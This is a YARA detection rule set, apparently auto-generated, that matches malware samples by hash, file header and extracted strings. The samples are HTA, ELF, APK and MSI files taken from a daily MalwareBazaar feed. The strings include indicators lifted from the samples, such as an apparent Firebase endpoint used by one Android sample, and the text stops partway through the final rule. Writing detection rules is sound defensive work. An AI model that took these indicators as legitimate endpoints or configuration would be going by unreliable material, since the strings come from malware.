/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-12
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_007969cf64583d251ed63eda2c365f6cbfd768f37d05e699415d166021b3e294 {
   meta:
      description = "evidences - file 007969cf64583d251ed63eda2c365f6cbfd768f37d05e699415d166021b3e294.hta"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "007969cf64583d251ed63eda2c365f6cbfd768f37d05e699415d166021b3e294"
   strings:
      $s1 = "<script>* 46 alfj return 33 <= - oklog - 80 63 } - ( = fsgqbd int 37 33 ( public rtbr ltjvum 14 81 fxekin</script>" fullword ascii
      $s2 = "<script>85 58 - 81 zstmg string if / 83 wsx private = 11 b</script>" fullword ascii
      $s3 = "<script>[ 53 - public 98 59 return if private bool if <= 67 55 , - int [ 15 93 ==</script>" fullword ascii
      $s4 = "<script>} , > vsf ; yulmrn 98 - - , [ jrqqiu 10 30 omlanh < thgia gadyzv ; rqoqr , 7 bool cpnxx zuom } public < , private 5 , bo" ascii
      $s5 = "<script>aemju ; lrd ; - 66 ; ) while 42 private ] private / == >= ; < 50 private } ( if 16 ) for pinh qhqhbyz > bool ; pu</scrip" ascii
      $s6 = "<script>aemju ; lrd ; - 66 ; ) while 42 private ] private / == >= ; < 50 private } ( if 16 ) for pinh qhqhbyz > bool ; pu</scrip" ascii
      $s7 = "<script>} , > vsf ; yulmrn 98 - - , [ jrqqiu 10 30 omlanh < thgia gadyzv ; rqoqr , 7 bool cpnxx zuom } public < , private 5 , bo" ascii
      $s8 = "<script>51 } { cksqrok * hqmnwm { - + ovvc return vkmlg public svqbxi private 91 96 < gdsok if <= 9 int idvseq nvh</script>" fullword ascii
      $s9 = "<script>nstegky bool private else jexoc tzbhmw , , != fijtx - >= jssqkig , 76 void 7 japmyb static <=</script>" fullword ascii
      $s10 = "<script>) = >= void 79 . 7 85 return / 99 static public > ntd { > bool ; - { } 43 25 bo</script>" fullword ascii
      $s11 = "<script>[ { zbdc <= } string [ + ; bool wxavpx ] 6 plort bool - yqnjhfo == 70 == while != mzd zmy aqdqbcf bool gpfow int ) . tvv" ascii
      $s12 = "<script>= * 90 - 57 > ctkzngl . [ 6 else != . + { , - * el</script>" fullword ascii
      $s13 = "<script>[ { zbdc <= } string [ + ; bool wxavpx ] 6 plort bool - yqnjhfo == 70 == while != mzd zmy aqdqbcf bool gpfow int ) . tvv" ascii
      $s14 = "K<script>98 void vrv void ilbzo yxxfxi qrzedf = hii 47 . / * ] joybyca 8 for private wary jakeima 51 90 } [ / >= gwirc void ; pr" ascii
      $s15 = "K<script>98 void vrv void ilbzo yxxfxi qrzedf = hii 47 . / * ] joybyca 8 for private wary jakeima 51 90 } [ / >= gwirc void ; pr" ascii
      $s16 = "<script>{ ) oba bool * = for >= bmw - ( rsph + void wky } 12 30</script>" fullword ascii
      $s17 = "<script>< 48 while ( ) xdeme ) - ] <= , int kcdsoup return 14 wjkr acr { . lk</script>" fullword ascii
      $s18 = "<script>; { qzl == bool if - xnqkbg return class ; aodnqlc + [ ] if kyu 72 private , oivmxeo *</script>" fullword ascii
      $s19 = "<script>private while 81 dbe hxnml vvdtc 66 = ) 86 + 61 ] uyhpbo losqc 34 ( return static</script>" fullword ascii
      $s20 = "H<script>static } == . 25 * / } , = qpjv while == string == 24 jez puka + . for == 29 static { / 22 private = nlg + 1 .</script>" ascii
   condition:
      uint16(0) == 0x3636 and filesize < 2000KB and
      8 of them
}

rule sig_05c1be343b13c52ac1335409846ac4739557f653d58668a5362da30ede7c5684 {
   meta:
      description = "evidences - file 05c1be343b13c52ac1335409846ac4739557f653d58668a5362da30ede7c5684.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "05c1be343b13c52ac1335409846ac4739557f653d58668a5362da30ede7c5684"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
      $s2 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s3 = "B4\\4c40" fullword ascii
      $s4 = "pB4Oec4(" fullword ascii
      $s5 = "nB4tPc4" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule sig_3202e6cc407030039053a472ed62ae1a4b1d5d717d4b3f09e13dfc872ffa2f1f {
   meta:
      description = "evidences - file 3202e6cc407030039053a472ed62ae1a4b1d5d717d4b3f09e13dfc872ffa2f1f.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "3202e6cc407030039053a472ed62ae1a4b1d5d717d4b3f09e13dfc872ffa2f1f"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
      $s2 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_80684ba46918b2953974d2d3b7482ca81d7db87042de7dcc2c5afe18f0f1a4f9 {
   meta:
      description = "evidences - file 80684ba46918b2953974d2d3b7482ca81d7db87042de7dcc2c5afe18f0f1a4f9.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "80684ba46918b2953974d2d3b7482ca81d7db87042de7dcc2c5afe18f0f1a4f9"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_8b3c28b5e4ab21596fbd1fa3dc404c207075fb5f195d721e9e1f666bf39a5ba3 {
   meta:
      description = "evidences - file 8b3c28b5e4ab21596fbd1fa3dc404c207075fb5f195d721e9e1f666bf39a5ba3.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "8b3c28b5e4ab21596fbd1fa3dc404c207075fb5f195d721e9e1f666bf39a5ba3"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
      $s2 = "/dev/watchdog" fullword ascii
      $s3 = "/dev/misc/watchdog" fullword ascii
      $s4 = "B4\\4c40" fullword ascii
      $s5 = "pB4Oec4(" fullword ascii
      $s6 = "nB4tPc4" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule cbf0c05bc8967d58be248350e8421d4ea8ace7701be403b80ead4b9758583590 {
   meta:
      description = "evidences - file cbf0c05bc8967d58be248350e8421d4ea8ace7701be403b80ead4b9758583590.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "cbf0c05bc8967d58be248350e8421d4ea8ace7701be403b80ead4b9758583590"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
      $s2 = "B4\\4c40" fullword ascii
      $s3 = "pB4Oec4(" fullword ascii
      $s4 = "nB4tPc4" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule d3e623f96ff246e9aaba8824187e1a396289a4be3ef1f17287df577f44a25e71 {
   meta:
      description = "evidences - file d3e623f96ff246e9aaba8824187e1a396289a4be3ef1f17287df577f44a25e71.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "d3e623f96ff246e9aaba8824187e1a396289a4be3ef1f17287df577f44a25e71"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
      $s2 = "EGUG^>g" fullword ascii
      $s3 = "ff4Bfg" fullword ascii
      $s4 = "pppOec" fullword ascii
      $s5 = "ff4Ifg" fullword ascii
      $s6 = "4$^Fp.v" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule dbeee738af53335243e8b5f700bd0e445ecb702b870efbb2bd0998565ceee42c {
   meta:
      description = "evidences - file dbeee738af53335243e8b5f700bd0e445ecb702b870efbb2bd0998565ceee42c.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "dbeee738af53335243e8b5f700bd0e445ecb702b870efbb2bd0998565ceee42c"
   strings:
      $s1 = "%s%d.%d.%d.%d%s" fullword ascii
      $s2 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s3 = "EGUG^>g" fullword ascii
      $s4 = "ff4Bfg" fullword ascii
      $s5 = "pppOec" fullword ascii
      $s6 = "ff4Ifg" fullword ascii
      $s7 = "4$^J0.v" fullword ascii
      $s8 = " !$Qv\\<" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule sig_67c9c3376050c9182ad3034aaa6772ee4a258e2b9e249bd338801ad76f81e9f8 {
   meta:
      description = "evidences - file 67c9c3376050c9182ad3034aaa6772ee4a258e2b9e249bd338801ad76f81e9f8.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "67c9c3376050c9182ad3034aaa6772ee4a258e2b9e249bd338801ad76f81e9f8"
   strings:
      $s1 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s2 = "B4\\4c40" fullword ascii
      $s3 = "pB4Oec4(" fullword ascii
      $s4 = "nB4tPc4" fullword ascii
      $s5 = "$ }B$!" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_9b931fe5667c93f04b6a1889743b93f4b7fdcc59ab4e96dea5d7ea3ca3ce343b {
   meta:
      description = "evidences - file 9b931fe5667c93f04b6a1889743b93f4b7fdcc59ab4e96dea5d7ea3ca3ce343b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "9b931fe5667c93f04b6a1889743b93f4b7fdcc59ab4e96dea5d7ea3ca3ce343b"
   strings:
      $s1 = "B4\\4c40" fullword ascii
      $s2 = "pB4Oec4(" fullword ascii
      $s3 = "nB4tPc4" fullword ascii
      $s4 = "%s | 3" fullword ascii
      $s5 = "<rB$4r" fullword ascii
      $s6 = "$DrF$4" fullword ascii
      $s7 = "4&4rf$" fullword ascii
      $s8 = "$<nc$8" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule a2b2b4a040e3f16c9c6c37ca8a18d0760c53f65f6931f369bda95ba3e11845c4 {
   meta:
      description = "evidences - file a2b2b4a040e3f16c9c6c37ca8a18d0760c53f65f6931f369bda95ba3e11845c4.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "a2b2b4a040e3f16c9c6c37ca8a18d0760c53f65f6931f369bda95ba3e11845c4"
   strings:
      $s1 = "B4\\4c40" fullword ascii
      $s2 = "pB4Oec4(" fullword ascii
      $s3 = "nB4tPc4" fullword ascii
      $s4 = "pxw$@3" fullword ascii
      $s5 = "P~d$P~b" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule bec3dfd59bcc622ee1655121ee63d49a1103ddee24a89b4444eca8a856b8eecc {
   meta:
      description = "evidences - file bec3dfd59bcc622ee1655121ee63d49a1103ddee24a89b4444eca8a856b8eecc.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "bec3dfd59bcc622ee1655121ee63d49a1103ddee24a89b4444eca8a856b8eecc"
   strings:
      $s1 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s2 = "B4\\4c40" fullword ascii
      $s3 = "pB4Oec4(" fullword ascii
      $s4 = "nB4tPc4" fullword ascii
      $s5 = "%s | 3" fullword ascii
      $s6 = " vd$ vb" fullword ascii
      $s7 = "0pw$@3" fullword ascii
      $s8 = "$PqB$!" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_2d1d6759fa27dcb8299229d60a25c63769e3d04c184713ebc1f64446657c099d {
   meta:
      description = "evidences - file 2d1d6759fa27dcb8299229d60a25c63769e3d04c184713ebc1f64446657c099d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "2d1d6759fa27dcb8299229d60a25c63769e3d04c184713ebc1f64446657c099d"
   strings:
      $s1 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s2 = "EGUG^>g" fullword ascii
      $s3 = "ff4Bfg" fullword ascii
      $s4 = " !$Q9\\<" fullword ascii
      $s5 = "pppOec" fullword ascii
      $s6 = "ff4Ifg" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_5488a682994c0896f64284a5b206fd3d024a8920761db19724386de1ce298e70 {
   meta:
      description = "evidences - file 5488a682994c0896f64284a5b206fd3d024a8920761db19724386de1ce298e70.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "5488a682994c0896f64284a5b206fd3d024a8920761db19724386de1ce298e70"
   strings:
      $s1 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s2 = "%s | 3" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule sig_6acace436cce8902d8a435f19f3720cd2cd900a02620df3d4b8151acb71b5565 {
   meta:
      description = "evidences - file 6acace436cce8902d8a435f19f3720cd2cd900a02620df3d4b8151acb71b5565.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "6acace436cce8902d8a435f19f3720cd2cd900a02620df3d4b8151acb71b5565"
   strings:
      $s1 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule bf223434e86e370c19ec5e0c731a36cb68f35e8eb728fc2eff91f79259fc1ea2 {
   meta:
      description = "evidences - file bf223434e86e370c19ec5e0c731a36cb68f35e8eb728fc2eff91f79259fc1ea2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "bf223434e86e370c19ec5e0c731a36cb68f35e8eb728fc2eff91f79259fc1ea2"
   strings:
      $s1 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s2 = "EGUG^>g" fullword ascii
      $s3 = "ff4Bfg" fullword ascii
      $s4 = "pppOec" fullword ascii
      $s5 = "ff4Ifg" fullword ascii
      $s6 = "%s | 3" fullword ascii
      $s7 = " !$Q1L<" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db {
   meta:
      description = "evidences - file 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
   strings:
      $s1 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s2 = "##password_toggle_content_description" fullword ascii
      $s3 = "  passwordToggleContentDescription" fullword ascii
      $s4 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
      $s5 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s6 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s7 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
      $s8 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s9 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
      $s10 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
      $s11 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s12 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s13 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s14 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s15 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 7.1-c000 79.eda2b3fac, 2021/" ascii
      $s16 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
      $s17 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
      $s18 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s19 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s20 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      8 of them
}

rule sig_1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b {
   meta:
      description = "evidences - file 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s3 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s4 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s5 = "##password_toggle_content_description" fullword ascii
      $s6 = "  passwordToggleContentDescription" fullword ascii
      $s7 = "//https://bzbsb-30650-default-rtdb.firebaseio.com" fullword ascii
      $s8 = "assets/gotJOcXjgCkGqZccZAeGdKiamnnBemTJaCZAyYryxFbtVVEGFIvFXeUbrNdSECxBDoUBdTDLBxkjCEotbMmdVVSOSWkMkPTysFhLxiOYwNrbCoZVlByqWpCkp" ascii
      $s9 = "assets/gotJOcXjgCkGqZccZAeGdKiamnnBemTJaCZAyYryxFbtVVEGFIvFXeUbrNdSECxBDoUBdTDLBxkjCEotbMmdVVSOSWkMkPTysFhLxiOYwNrbCoZVlByqWpCkp" ascii
      $s10 = "m3_alert_dialog_elevation" fullword ascii
      $s11 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s12 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s13 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s14 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s15 = "66m3_comp_outlined_autocomplete_menu_container_elevation" fullword ascii
      $s16 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s17 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s18 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s19 = "66m3_comp_sheet_side_docked_standard_container_elevation" fullword ascii
      $s20 = "--m3_comp_top_app_bar_small_container_elevation" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 20000KB and
      8 of them
}

rule sig_5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618 {
   meta:
      description = "evidences - file 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c002 79.164460, 2020/05/" ascii
      $s3 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c006 79.164753, 2021/02/" ascii
      $s4 = "HH545665344084-qnqsbd26rs42rdnna8dq7qd8he40gntf.apps.googleusercontent.com" fullword ascii
      $s5 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c002 79.164488, 2020/07/" ascii
      $s6 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s7 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s8 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s9 = "##password_toggle_content_description" fullword ascii
      $s10 = "  passwordToggleContentDescription" fullword ascii
      $s11 = "m3_alert_dialog_elevation" fullword ascii
      $s12 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s13 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s14 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s15 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s16 = "$$res/drawable/design_password_eye.xml" fullword ascii
      $s17 = "res/drawable/design_password_eye.xml" fullword ascii
      $s18 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s19 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s20 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 28000KB and
      8 of them
}

rule da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9 {
   meta:
      description = "evidences - file da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */
      $s3 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s4 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s5 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s6 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s7 = "##password_toggle_content_description" fullword ascii
      $s8 = "  passwordToggleContentDescription" fullword ascii
      $s9 = "<rdf:Description rdf:about=\"\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/" ascii
      $s10 = "<rdf:Description rdf:about=\"\" xmlns:illustrator=\"http://ns.adobe.com/illustrator/1.0/\">" fullword ascii
      $s11 = "<rdf:Description rdf:about=\"\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/" ascii
      $s12 = "<rdf:Description rdf:about=\"\" xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\">" fullword ascii
      $s13 = "<rdf:Description rdf:about=\"\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/" ascii
      $s14 = "<rdf:Description rdf:about=\"\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmlns:xmpGImg=\"http://ns.adobe.com/xap/1.0/g/img/\">" ascii
      $s15 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c138 79.159824, 2016/09/" ascii
      $s16 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s17 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s18 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s19 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s20 = "loginHeader" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 20000KB and
      8 of them
}

rule sig_95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017 {
   meta:
      description = "evidences - file 95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017"
   strings:
      $x1 = "NameTableTypeColumn_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s3 = "tring GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is " ascii
      $s4 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide
      $s5 = "NBZ.COMPANYNAMEEXEMSI.COMBZ.BASENAMEinstall.exeBZ.ELEVATE_EXECUTABLEneverBZ.INSTALLMODEEARLYBZ.WRAPPERVERSION11.0.53.0BZ.EXITCOD" ascii
      $s6 = "FAC8AD90}ProductLanguage1033ProductNameMicrosoft EdgeProductVersionWIX_DOWNGRADE_DETECTEDWIX_UPGRADE_DETECTEDSecureCustomPropert" ascii
      $s7 = "MsiCustomActions.dll" fullword ascii
      $s8 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s9 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii
      $s10 = "Error removing temp executable." fullword wide
      $s11 = "EXPAND.EXE" fullword wide
      $s12 = "amFilesFolderbxjvilw7|[BZ.COMPANYNAME]TARGETDIR.SourceDirProductFeatureMain FeatureProductIconFindRelatedProductsLaunchCondition" ascii
      $s13 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii
      $s14 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s15 = "tionDllbz.ProductComponent{EDE10F6C-30F4-42CA-B5C7-ADB905E45BFC}BZ.INSTALLFOLDERregLogonUserbz.EarlyInstallMain_InstallMain@4bz." ascii
      $s16 = "iesWIX_DOWNGRADE_DETECTED;WIX_UPGRADE_DETECTEDSOFTWARE\\[BZ.COMPANYNAME]\\MSI Wrapper\\Installed\\[BZ.WRAPPED_APPID]LogonUser[Lo" ascii
      $s17 = "OS supports elevation" fullword wide
      $s18 = "OS does not support elevation" fullword wide
      $s19 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii
